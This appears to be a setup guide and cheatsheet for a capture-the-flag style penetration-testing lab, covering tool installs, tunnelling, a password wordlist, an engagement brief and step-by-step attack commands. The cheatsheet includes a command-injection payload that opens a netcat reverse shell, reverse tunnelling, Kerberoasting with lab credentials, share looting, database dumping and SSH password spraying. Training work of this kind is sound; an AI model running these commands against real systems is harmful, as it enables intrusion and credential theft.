# 🛠️ Nexus Pentest Tools & Setup Guide

Since the Nexus Enterprise Lab no longer includes a pre-built attacker container, you must configure your own pentesting environment. A local **Kali Linux** virtual machine (or WSL2 Kali instance) is highly recommended.

Below are the tools and configurations you need to interact with the lab, extracted from the original `attacker-box` design.

---

## 1. Core System Packages

Install these required packages via `apt-get` (Debian/Ubuntu/Kali):

```bash
sudo apt-get update
sudo apt-get install -y --no-install-recommends \
    bash curl wget nmap netcat-traditional dnsutils socat \
    python3 python3-pip python3-venv smbclient tcpdump \
    traceroute iputils-ping iproute2 net-tools openssh-client \
    proxychains4 hydra john gobuster masscan ldap-utils \
    postgresql-client vim less jq git file procps
```
*(Note: Kali Linux usually has most of these pre-installed)*

## 2. Python Pentesting Ecosystem (Impacket)

You will need the Impacket suite for Active Directory exploitation. Install them via `pip`:

```bash
python3 -m pip install --break-system-packages \
    impacket bloodhound ldap3 dnspython requests colorama pycryptodome
```
*(Note: If you prefer, install these inside a Python virtual environment to avoid `--break-system-packages`.)*

## 3. Chisel (For Pivoting & Tunneling)

Chisel is required to pivot from the DMZ to the internal Corporate Backbone.

```bash
wget -q https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz -O /tmp/chisel.gz
gunzip /tmp/chisel.gz
sudo mv /tmp/chisel /usr/local/bin/chisel
sudo chmod +x /usr/local/bin/chisel
```

## 4. Proxychains Configuration

To route your tools (like nmap or smbclient) through your Chisel tunnel, you must configure `proxychains4`.

Edit `/etc/proxychains4.conf` and ensure the last line is:
```ini
[ProxyList]
socks5 127.0.0.1 1080
```

## 5. Custom Lab Wordlist

Create a custom password list for brute-forcing services in the lab:

```bash
mkdir -p ~/pentest_workspace/wordlists
printf 'admin\nnexus\npassword\n123456\nadmin123\nNexus@2026\nWinter2026!\nDevOpsP@ss2026!\nNexusTechAdmin2026!\ndevops-remote@123\nHrDirector9921!\nNexusCISO_Mv@2026#\n' > ~/pentest_workspace/wordlists/nexus-passwords.txt
```

---

## 📄 Engagement Brief

You can save this as `ENGAGEMENT_BRIEF.txt` in your workspace to understand the lab scope.

```text
╔══════════════════════════════════════════════════════════════════╗
║         NEXUS GLOBAL ENTERPRISE — PENETRATION TEST              ║
║         Authorized Red Team Assessment — 2026-08-16             ║
╚══════════════════════════════════════════════════════════════════╝

CLIENT:    Nexus Global Logistics & Enterprise Systems
SCOPE:     Full-scope internal & external assessment
DURATION:  5 Days (TOCTOU window)

TARGET PERIMETER:
  External Gateway:  198.51.100.10  (WAF/Nginx Reverse Proxy)
  Mail Server:       10.0.1.30      (Port 8025 - Webmail UI)
  SSH Bastion:       10.0.1.40      (Port 22  - Jump Host)

OBJECTIVES (in order):
  [1] External recon & service fingerprinting
  [2] Gain initial foothold on DMZ (any service)
  [3] Pivot from DMZ to Core Backbone (10.0.2.0/24)
  [4] Enumerate Active Directory domain (nexus.internal)
  [5] Retrieve Data Center Crown Jewels (Flags)

CTF FLAG FORMAT: FLAG{...}
```

---

## 📝 Lab Cheatsheet

Save this as `CHEATSHEET.txt` for quick reference during your pentest.

```text
═══════════════════════════════════════════════
   NEXUS LAB — QUICK PENTEST CHEATSHEET
═══════════════════════════════════════════════

1. RECON
   nmap -sS -sV -p 80,443,22,8025,445 198.51.100.10
   nmap -sS -sV --script=banner 198.51.100.10
   curl -I http://198.51.100.10/
   curl http://198.51.100.10/robots.txt
   curl http://198.51.100.10/changelog.txt

2. WEB APP ATTACK (DMZ)
   gobuster dir -u http://198.51.100.10 -w /usr/share/wordlists/dirb/common.txt
   sqlmap -u "http://198.51.100.10/?track_id=NX-1234" --dbs

3. COMMAND INJECTION (Ping Diagnostic Tool)
   curl -X POST http://198.51.100.10/api/network/ping \
     -d "host=127.0.0.1; id; whoami"
   # Reverse Shell:
   curl -X POST http://198.51.100.10/api/network/ping \
     -d "host=127.0.0.1; nc -e /bin/sh 198.51.100.100 4444"

4. PIVOTING
   # Start chisel server (on attacker):
   chisel server --port 8888 --reverse &
   # On compromised DMZ host via cmd injection:
   chisel client 198.51.100.100:8888 R:1080:socks

   # Then use proxychains for all internal scanning:
   proxychains4 nmap -sT -Pn 10.0.2.10

5. ACTIVE DIRECTORY ENUMERATION
   smbclient -L //10.0.2.10 -N
   smbclient //10.0.2.10/IT-Backups -N
   ldapsearch -x -H ldap://10.0.2.10 -b "dc=nexus,dc=internal"
   GetNPUsers.py nexus.internal/ -no-pass -dc-ip 10.0.2.10
   GetUserSPNs.py nexus.internal/tahmed:DevOpsP@ss2026! -dc-ip 10.0.2.10

6. PRIVILEGE ESCALATION & CREDENTIAL LEAKS
   # Read IT-Backups share:
   smbclient //10.0.2.10/IT-Backups -N -c "get sync_prod_db.sh; get INFRA_RUNBOOK.txt"
   cat sync_prod_db.sh   # Contains DB credentials

7. DATA CENTER ACCESS
   # PostgreSQL:
   psql -h 10.0.3.20 -U nexus_admin -d nexus_prod -W
   # Inside DB:
   \dt
   SELECT * FROM system_vault_keys;
   SELECT * FROM employees;

8. BASTION SSH (Gray-Box Entry)
   ssh devops-remote@10.0.1.40
   # Default SSH pass spray: Winter2026! / Nexus@2026 / devops-remote@123

═══════════════════════════════════════════════
```
